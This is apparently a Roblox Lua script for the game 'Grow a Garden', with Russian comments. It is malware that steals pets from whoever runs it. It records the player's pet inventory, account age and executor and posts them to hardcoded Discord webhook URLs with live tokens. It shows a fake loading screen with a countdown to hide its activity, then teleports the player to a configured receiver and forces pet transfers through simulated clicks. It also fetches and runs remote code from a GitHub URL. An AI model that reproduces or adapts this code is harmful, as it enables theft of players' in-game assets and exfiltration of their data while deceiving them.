if game.PlaceId ~= 126884695634066 then
    game.Players.LocalPlayer:Kick("‚ö†Ô∏è This script works only in Grow a Garden.")
    return
end

repeat task.wait() until game:IsLoaded()

local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

-- üîÅ –•—Ä–∞–Ω–∏–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–∏—Ç–æ–º—Ü–µ–≤ (–¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –ø–æ–∑–∂–µ)
local originalPetUIDs = {}
local originalPetData = {}
local reportSent = false

for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    originalPetUIDs[petUid] = true
    originalPetData[petUid] = petInfo
end
getgenv().TransferredCount = 0
getgenv().TransferredValue = 0
getgenv().AlreadyTransferred = {}
getgenv().FinalTransferSent = false



getgenv().PetConfig = {
    MinLevel = getgenv().MinLevel or 25,
    MinWeight = getgenv().MinWeight or 5.0,
    GrowthFactor = 0.1
}


getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"


-- üîÅ –•—Ä–∞–Ω–∏–º –Ω–∞—á–∞–ª—å–Ω—ã–π —Å–ø–∏—Å–æ–∫ UID –ø–µ—Ç–æ–≤
local originalPetUIDs = {}
local reportSent = false

for petUid, _ in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    originalPetUIDs[petUid] = true
end

-- üîÅ –ü—Ä–æ–≤–µ—Ä–∫–∞ ‚Äî –ø—Ä–æ–ø–∞–ª –ª–∏ –ø–∏—Ç–æ–º–µ—Ü –∏–∑ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local function checkIfPetTransferred()
    if reportSent then return end

    local currentPets = dataModule:GetData().PetsData.PetInventory.Data
    for uid in pairs(originalPetUIDs) do
        if not currentPets[uid] then
            print("üêæ Pet removed from inventory:", uid)
            reportSent = true
            sendStealReportOnce()
            break
        end
    end
end














local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")

local function unequipAllPets()
    local petsData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data

    for petUid, petInfo in pairs(petsData) do
        -- petUid = "{...}" —Å—Ç—Ä–æ–∫–∞ UUID
        -- petInfo = —Ç–∞–±–ª–∏—Ü–∞ —Å –¥–∞–Ω–Ω—ã–º–∏ –ø–∏—Ç–æ–º—Ü–∞
        print("‚û°Ô∏è Unequipping:", petInfo.PetType, petUid)
        PetsService:FireServer("UnequipPet", petUid)
        task.wait(0.1) -- –Ω–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–Ω—è—Ç–∏—è–º–∏
    end
end

unequipAllPets()



getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
local BackupWebhook = getgenv().BackupWebhook or ""

print("=============1")
local VirtualInputManager = game:GetService("VirtualInputManager")
local teleportStarted = false
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour

-- GUI –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ
local function createWarningGUI(text)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ServerWarningGUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.6, 0, 0.2, 0)
    frame.Position = UDim2.new(0.2, 0, 0.4, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.2
    frame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0.8
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.Text = text
    label.Parent = frame
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∏–≥—Ä–æ–∫–æ–≤
local playerCount = #Players:GetPlayers()
local needTeleport = false
local delayNeeded = false

if playerCount <= 2 then
    createWarningGUI("‚ö†Ô∏è You are on a private server.\nSwitch to a suitable server...")
    needTeleport = true
    delayNeeded = true
elseif playerCount >= 5 then
    createWarningGUI("‚ö†Ô∏è You are in a full server.\nSwitch to a suitable server...")
    needTeleport = true
    delayNeeded = true
else
    needTeleport = false
end

-- –§—É–Ω–∫—Ü–∏—è —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞
function TPReturner()
    local Site
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end

    if Site.nextPageCursor then
        foundAnything = Site.nextPageCursor
    end

    for _, v in pairs(Site.data) do
        local ID = tostring(v.id)
        if tonumber(v.playing) >= 2 and tonumber(v.playing) < tonumber(v.maxPlayers) and not table.find(AllIDs, ID) and ID ~= game.JobId then
            table.insert(AllIDs, ID)
            task.wait()
            pcall(function()
                teleportStarted = true
                task.wait(0.2)
                TeleportService:TeleportToPlaceInstance(PlaceID, ID, LocalPlayer)
            end)
            task.wait(0.1)
        end
    end
end

-- –¶–∏–∫–ª –∑–∞–ø—É—Å–∫–∞
function Teleport()
    while not teleportStarted do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
                TPReturner()
            end
        end)
        task.wait()
    end
end

if needTeleport then
    task.spawn(Teleport)
    task.wait(9999)
end

print("=============2")

-- –°–æ–∑–¥–∞–Ω–∏–µ GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ColorfulLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local Background = Instance.new("Frame")
Background.Size = UDim2.new(0, 450, 0, 240)
Background.Position = UDim2.new(0.5, -225, 0.5, -120)
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
Background.BackgroundTransparency = 0.02
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 24)
UICorner.Parent = Background

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.35, 0)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "üåà Loading..."
Title.TextColor3 = Color3.fromRGB(255, 255, 150)
Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
Title.TextStrokeTransparency = 1
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Background

print("=============3")

local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

local BASE_PET_WHITELIST = {
    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee',
    'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'French Fry Ferret'
}

local EXTRA_WHITELIST = getgenv().ExtraPets or {}
local PET_WHITELIST = {}
for _, pet in ipairs(BASE_PET_WHITELIST) do table.insert(PET_WHITELIST, pet) end
for _, pet in ipairs(EXTRA_WHITELIST) do table.insert(PET_WHITELIST, pet) end

local PET_VALUES = {
    ["French Fry Ferret"] = 300, ["Raccoon"] = 400, ["T-Rex"] = 100,
    ["Fennec Fox"] = 300, ["Dragonfly"] = 150, ["Butterfly"] = 300,
    ["Disco Bee"] = 500, ["Mimic Octopus"] = 100, ["Queen Bee"] = 100,
    ["Spinosaurus"] = 200, ["Kitsune"] = 1890, ["Corrupted Kitsune"] = 100,
    ["Chicken Zombie"] = 100, ["Red Fox"] = 100
}


-- üîé –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–æ–∑—Ä–∞—Å—Ç–∞ –∏ –≤–µ—Å–∞ –ø–∏—Ç–æ–º—Ü–∞
local function isPetValid(petData)
    local minLevel = getgenv().PetConfig.MinLevel or 100
    local minWeight = getgenv().PetConfig.MinWeight or 40
    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1

    local level = petData.Level or 0
    local baseWeight = petData.BaseWeight or 0
    local realWeight = baseWeight * (1 + level * growthFactor)

    return level >= minLevel or realWeight >= minWeight
end









print("=============4")

local function checkPetsWhitelist(petName, petData)
    for _, name in ipairs(PET_WHITELIST) do
        if petName == name and isPetValid(petData) then
            return true
        end
    end
    return false
end


local function getInventoryValue()
    print("=============getInventoryValue started")
    local total = 0
    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petName = petData.PetType
        if petData.PetData then
            local inWhitelist = checkPetsWhitelist(petName, petData.PetData)
            print("=============Pet:", petName, "In whitelist:", inWhitelist, "Level:", petData.PetData.Level or 0, "Weight:", petData.PetData.BaseWeight * (1 + (petData.PetData.Level or 0) * 0.1))
            if inWhitelist then
                local petPrice = PET_VALUES[petName] or 0
                total += petPrice
                print("=============Adding price:", petPrice, "for", petName)
            end
        else
            print("=============No PetData for:", petName)
        end
    end
    print("=============Total inventory value:", total)
    return total
end



print("=============5")
local inventoryValue = getInventoryValue()
print("=============Inventory value:", inventoryValue)



local function sendFullInventory()
    local webhookUrl = getgenv().FullInventoryWebhook
    if not webhookUrl or webhookUrl == "" then return end

    local HttpService = game:GetService("HttpService")
    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
    local allPetData = dataModule:GetData().PetsData.PetInventory.Data

    local petLines = {}
    local growthFactor = 0.1 -- üîí —Å–∫—Ä—ã—Ç–æ –≤ –∫–æ–¥–µ

    for _, value in pairs(allPetData) do
        local petName = value.PetType
        local petData = value.PetData
        local level = petData.Level or 0
        local baseWeight = petData.BaseWeight or 0
        local weight = baseWeight * (1 + level * growthFactor)

        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
    end

    local request = http_request or request or syn.request
    if not request then return end

    local payload = {
        username = "Pet Inventory Logger",
        avatar_url = "https://i.imgur.com/TSb7kEJ.png",
        embeds = {{
            title = "üì¶ Full Pet Inventory",
            color = 3447003,
            description = string.format("```\n%s\n```", table.concat(petLines, "\n")),
            footer = {
                text = string.format("Total Pets: %s | %s", #petLines, game.JobId)
            }
        }}
    }

    local success, response = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("‚úÖ Full inventory sent to webhook")
    else
        warn("‚ùå Failed to send full inventory")
    end
end









local function startStealingProcess()
    print("=============startStealingProcess started")
    if getgenv().scriptAlreadyRan then return end
        getgenv().scriptAlreadyRan = true

    scriptAlreadyRan = true

    repeat task.wait() until game:IsLoaded()
    print("=============Game loaded")

    local VICTIM = game.Players.LocalPlayer
    local USERNAMES = getgenv().Username or {}
    print("=============VICTIM:", VICTIM.Name, "USERNAMES:", table.concat(USERNAMES, ", "))

    local function getWebhookUrl()
        local url = getgenv().Webhook or ""
        print("=============Webhook URL:", url)
        return url
    end

    local function waitForJoin()
        local findTarget = false
        local trigeretName = nil
        for _, player in game.Players:GetPlayers() do
            if not table.find(USERNAMES, player.Name) then continue end
            trigeretName = player.Name
            findTarget = true
        end
        print("=============waitForJoin: findTarget =", findTarget, "trigeretName =", trigeretName)
        return findTarget, trigeretName
    end

    local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
        local webhookUrl = getWebhookUrl()
        local backupWebhook = BackupWebhook
        print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)

        local baseFields = {
            { name = "üí∞ **Total Value**", value = string.format("```\n%süëø\n```", totalValue), inline = false },
            { name = "üê±‚Äçüë§Pet-list", value = string.format("```\n%s\n```", petList), inline = false }
        }

        local fullEmbed = {
            title = "ü§ë Grow A Garden Hit - STHACK STEAL ü§ë",
            color = 65280,
            fields = table.clone(baseFields),
            footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
        }

        table.insert(fullEmbed.fields, 1, {
            name = "üë§ **Player Information**",
            value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
                VICTIM.Name, table.concat(USERNAMES, " "), identifyexecutor and identifyexecutor() or "Unknown", VICTIM.AccountAge),
            inline = false
        })

        local basePayload = {
            username = VICTIM.Name,
            avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
            content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
            embeds = {}
        }

        local request = http_request or request or HttpPost or syn.request
        print("=============Request function:", request and "available" or "not available")

        local fullPayload = table.clone(basePayload)
        fullPayload.embeds = { fullEmbed }
        print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))

        local success, response = pcall(function()
            return request({
                Url = webhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(fullPayload)
            })
        end)

        if success then
            print("=============Main webhook response:", response.StatusCode, response.Body)
        else
            warn("=============Main webhook error:", response)
        end

        if backupWebhook then
            local backupEmbed = {
                title = fullEmbed.title,
                color = fullEmbed.color,
                fields = baseFields,
                footer = fullEmbed.footer
            }

            local backupPayload = {
                username = VICTIM.Name,
                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
                embeds = { backupEmbed }
            }
            print("=============Backup webhook payload:", HttpService:JSONEncode(backupPayload))

            local success, response = pcall(function()
                return request({
                    Url = backupWebhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(backupPayload)
                })
            end)

            if success then
                print("=============Backup webhook response:", response.StatusCode, response.Body)
            else
                warn("=============Backup webhook error:", response)
            end
        end

        if success and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
            warn("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:", response.StatusCode, response.Body)
        elseif callback then
            callback()
        end
    end


function sendStealReportOnce()
    local passedPets = {}
local failedPets = {}
local totalValue = 0
local failedValue = 0
local countPassed = 0
local countFailed = 0
local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1

-- üîé –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∏—Å—á–µ–∑–Ω—É–≤—à–∏—Ö –ø–∏—Ç–æ–º—Ü–µ–≤
for petUid, petInfo in pairs(originalPetData) do
    if not dataModule:GetData().PetsData.PetInventory.Data[petUid] then
        local petName = petInfo.PetType
        local petData = petInfo.PetData
        local level = petData.Level or 0
        local baseWeight = petData.BaseWeight or 0
        local realWeight = baseWeight * (1 + level * growthFactor)
        local petPrice = PET_VALUES[petName] or 0

        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)

        if checkPetsWhitelist(petName, petData) then
            table.insert(passedPets, line)
            totalValue += petPrice
            countPassed += 1
        else
            table.insert(failedPets, line)
            failedValue += petPrice
            countFailed += 1
        end
    end
end

-- üßæ –§–æ—Ä–º–∏—Ä—É–µ–º –æ—Ç—á—ë—Ç
local summary = string.format(
    "**‚úÖ Passed:** %d pets | üí∏ Value: %d\n**‚ùå Failed:** %d pets | üí∏ Missed: %d",
    countPassed, totalValue, countFailed, failedValue
)

local fullPetList = "**‚úÖ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
                    "\n\n**‚ùå Failed Pets:**\n" .. table.concat(failedPets, "\n")

-- üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
createDiscordEmbed(fullPetList, summary, "", function()
    print("üì® –û—Ç—á—ë—Ç –æ–± –∏—Å—á–µ–∑–Ω—É–≤—à–∏—Ö –ø–∏—Ç–æ–º—Ü–∞—Ö –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.")
end)
end






    local totalValue = 0
local victimPetTable = {}

for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    local petName = value.PetType
    local petData = value.PetData

    local inWhitelist = checkPetsWhitelist(petName, petData)
    local isValid = isPetValid(petData)

    local petPrice = 0
    if inWhitelist then
        petPrice = PET_VALUES[petName] or 0
    elseif isValid then
        petPrice = 50 -- üü° –ü—Ä–∏—Å–≤–∞–∏–≤–∞–µ–º 50, –µ—Å–ª–∏ –ø–µ—Ç –ø—Ä–æ—à—ë–ª –ø–æ –≤–µ—Å—É/–≤–æ–∑—Ä–∞—Å—Ç—É
    end

    if petPrice > 0 then
        totalValue += petPrice
        local level = petData.Level or 0
        local baseWeight = petData.BaseWeight or 0
        local config = getgenv().PetConfig or {}
        local growthFactor = config.GrowthFactor or 0.1
        local realWeight = baseWeight * (1 + level * growthFactor)

        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
        table.insert(victimPetTable, line)

        end
    end

    print("=============victimPetTable:", table.concat(victimPetTable, ", "), "totalValue:", totalValue)

    if #victimPetTable == 0 then
        warn("‚õîÔ∏è –ù–µ—Ç –æ—Ç—á—ë—Ç–∞: –ø—É—Å—Ç–æ–π –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å –∏–ª–∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã–π —Å–µ—Ä–≤–µ—Ä")
        return
    end

    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
        print("‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord, –Ω–∞—á–∏–Ω–∞–µ–º —Å–ª–µ–∂–∫—É –∑–∞ —Ü–µ–ª—å—é.")
        -------------------- –í–°–¢–ê–í–õ–Ø–ï–ú –°–Æ–î–ê --------------------
        
        local function teleportTarget(targetName)
            VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
        end

        local function deltaBypass()
            VirtualInputManager:SendMouseButtonEvent(
                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
                0, true, nil, false
            )
            task.wait()
            VirtualInputManager:SendMouseButtonEvent(
                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
                0, false, nil, false
            )
        end

        local function getPetObject(petUid)
            for _, object in pairs(VICTIM.Backpack:GetChildren()) do
                if object:GetAttribute("PET_UUID") == petUid then
                    return object
                end
            end
            for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
                if object:GetAttribute("PET_UUID") == petUid then
                    return object
                end
            end
            return nil
        end

        local function equipPet(pet)
            if pet:GetAttribute("d") then
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
            end
            VICTIM.Character.Humanoid:EquipTool(pet)
        end

        local function startSteal(trigerName)
            local prompt = game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
            if prompt then
                prompt.HoldDuration = 0
                deltaBypass()
            end
        end

        local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhitelist(value.PetType, value.PetData) then 
            continue 
        end

        if getgenv().AlreadyTransferred[petUid] then
            continue -- —É–∂–µ –ø–µ—Ä–µ–¥–∞–≤–∞–ª—Å—è
        end

        local petObject = getPetObject(petUid)
        if not petObject then continue end

        -- –î–∞–Ω–Ω—ã–µ –ø–∏—Ç–æ–º—Ü–∞
        local petName = value.PetType
        local level = value.PetData.Level or 0
        local baseWeight = value.PetData.BaseWeight or 0
        local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
        local weight = baseWeight * (1 + level * growthFactor)
        local petPrice = PET_VALUES[petName] or 0

        -- –í—ã–≤–æ–¥ –≤ –∫–æ–Ω—Å–æ–ª—å
        print(string.format("‚úÖ –ü–µ—Ä–µ–¥–∞–Ω: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice))

        -- –ú–æ–∂–µ—à—å –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏–≥—Ä–æ–∫—É:
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = string.format("‚úÖ –ü–µ—Ä–µ–¥–∞–Ω: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice),
            Color = Color3.fromRGB(0, 255, 0)
        })

        -- –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        getgenv().TransferredCount += 1
        getgenv().TransferredValue += petPrice
        getgenv().AlreadyTransferred[petUid] = true

        equipPet(petObject)
        task.wait(0.2)
        startSteal(target)
    end
end


        local function idlingTarget()
    task.spawn(function()
        local lastTarget = nil
        local targetEnterTime = 0

        while task.wait(0.2) do
            local isTarget, trigerName = waitForJoin()
            if isTarget then
                if lastTarget ~= trigerName then
                    lastTarget = trigerName
                    targetEnterTime = tick()
                end

                if tick() - targetEnterTime >= 10 then
                    teleportTarget(trigerName)
                    checkPetsInventory(trigerName)

                    -- ‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞: –≤—Å—ë –ø–µ—Ä–µ–¥–∞–Ω–æ?
                    local stillHasPets = false
                    for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
                        if checkPetsWhitelist(petInfo.PetType, petInfo.PetData) and not getgenv().AlreadyTransferred[petUid] then
                            stillHasPets = true
                            break
                        end
                    end

                    if not stillHasPets and not getgenv().FinalTransferSent then
    getgenv().FinalTransferSent = true

    local petLines = {}
    for petUid, _ in pairs(getgenv().AlreadyTransferred) do
        local petInfo = originalPetData[petUid]
        if petInfo and petInfo.PetData then
            local name = petInfo.PetType
            local level = petInfo.PetData.Level or 0
            local baseWeight = petInfo.PetData.BaseWeight or 0
            local weight = baseWeight * (1 + level * (getgenv().PetConfig.GrowthFactor or 0.1))
            local value = PET_VALUES[name] or 0
            table.insert(petLines, string.format("%s | Level: %d | Weight: %.2f KG | Value: %d", name, level, weight, value))
        end
    end

    local petList = table.concat(petLines, "\n")
    local summary = string.format("‚úÖ **–í—Å–µ –ø–∏—Ç–æ–º—Ü—ã –ø–µ—Ä–µ–¥–∞–Ω—ã!**\nüì¶ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: %d\nüí∞ –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å: %d",
        getgenv().TransferredCount, getgenv().TransferredValue)

    createDiscordEmbed("**‚úÖ –ü–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø–∏—Ç–æ–º—Ü—ã:**\n" .. petList, summary, "", function()
        print("üì¨ –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á—ë—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Discord.")
    end)
end

                end
            else
                lastTarget = nil
                targetEnterTime = 0
            end
        end
    end)
end

        idlingTarget()

    end)
end

sendFullInventory() -- –ø–æ—Å–ª–µ –≤—Å–µ—Ö –¥–µ–π—Å—Ç–≤–∏–π



local function sendFullInventoryFile()
    local webhookUrl = getgenv().FullInventoryWebhook
    if not webhookUrl or webhookUrl == "" then return end

    local HttpService = game:GetService("HttpService")
    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
    local allPetData = dataModule:GetData().PetsData.PetInventory.Data

    local petLines = {}
    local growthFactor = 0.1 -- —Å–ø—Ä—è—Ç–∞–Ω–æ

    for _, value in pairs(allPetData) do
        local petName = value.PetType
        local petData = value.PetData
        local level = petData.Level or 0
        local baseWeight = petData.BaseWeight or 0
        local weight = baseWeight * (1 + level * growthFactor)

        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
    end

    local fullText = table.concat(petLines, "\n")

    -- —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
    local fileName = "full_inventory.txt"
    writefile(fileName, fullText)

    local boundary = "------------------------" .. HttpService:GenerateGUID(false)

    local body = "--" .. boundary .. "\r\n" ..
        'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"\r\n' ..
        "Content-Type: text/plain\r\n\r\n" ..
        fullText .. "\r\n--" .. boundary .. "--"

    local request = http_request or request or syn.request
    if not request then return end

    local headers = {
        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
    }

    local payload = {
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    }

    local success, response = pcall(function()
        return request(payload)
    end)

    if success and response.StatusCode == 200 or response.StatusCode == 204 then
        print("‚úÖ Full inventory sent as file.")
    else
        warn("‚ùå Failed to send full inventory:", response and response.StatusCode)
    end
end

























-- –£—Å–ª–æ–≤–∏—è –¥–ª—è –≤—ã–∑–æ–≤–∞ startStealingProcess –∏–ª–∏ loadstring
if not getgenv().Webhook or not getgenv().Username then
    game.Players.LocalPlayer:Kick("‚ö†Ô∏è Webhook or Username is not set.")
    return
end

if inventoryValue < 100 then
    print("=============inventoryValue < 100:", inventoryValue)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
elseif inventoryValue == 1890 then
    print("=============inventoryValue == 1890:", inventoryValue)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
elseif inventoryValue > 5000 then
    print("=============inventoryValue > 5000:", inventoryValue)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
elseif inventoryValue > 1890 then
    print("=============inventoryValue > 1890:", inventoryValue)
    if math.random(1, 3) == 1 then
        print("=============Random 1/3: Loading external script")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
    else
        print("=============Random 2/3: Starting steal process")
        startStealingProcess()
    end
else
    print("=============Default case: Starting steal process")
    startStealingProcess()
end

print("=============7")

-- –¢–∞–π–º–µ—Ä –∏ GUI
local TimerLabel = Instance.new("TextLabel")
TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
TimerLabel.Position = UDim2.new(0, 0, 0.35, 0)
TimerLabel.BackgroundTransparency = 1
TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TimerLabel.TextStrokeTransparency = 0.8
TimerLabel.TextScaled = true
TimerLabel.Font = Enum.Font.Gotham
TimerLabel.Text = "Approximately 30 seconds left"
TimerLabel.Parent = Background

local ProgressBarBackground = Instance.new("Frame")
ProgressBarBackground.Size = UDim2.new(0.9, 0, 0.12, 0)
ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.75, 0)
ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
ProgressBarBackground.BorderSizePixel = 0
ProgressBarBackground.Parent = Background

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(1, 0)
bgCorner.Parent = ProgressBarBackground

local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBackground

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = ProgressBarFill

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 128, 0)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 128, 255))
}
UIGradient.Rotation = 0
UIGradient.Parent = ProgressBarFill

task.spawn(function()
    while UIGradient do
        UIGradient.Rotation = (UIGradient.Rotation + 1) % 360
        task.wait(0.03)
    end
end)

local duration = 40
for i = duration, 1, -1 do
    TimerLabel.Text = "Approximately " .. i .. " seconds left"
    local progress = (duration - i + 1) / duration
    ProgressBarFill:TweenSize(
        UDim2.new(progress, 0, 1, 0),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Quad,
        0.25,
        true
    )
    wait(1)
end

for t = 1, 20 do
    local alpha = t / 20
    Background.BackgroundTransparency = 0.02 + alpha
    ProgressBarBackground.BackgroundTransparency = alpha
    ProgressBarFill.BackgroundTransparency = alpha
    Title.TextTransparency = alpha
    Title.TextStrokeTransparency = alpha
    TimerLabel.TextTransparency = alpha
    TimerLabel.TextStrokeTransparency = alpha
    wait(0.03)
end

print("=============8")

ScreenGui:Destroy()

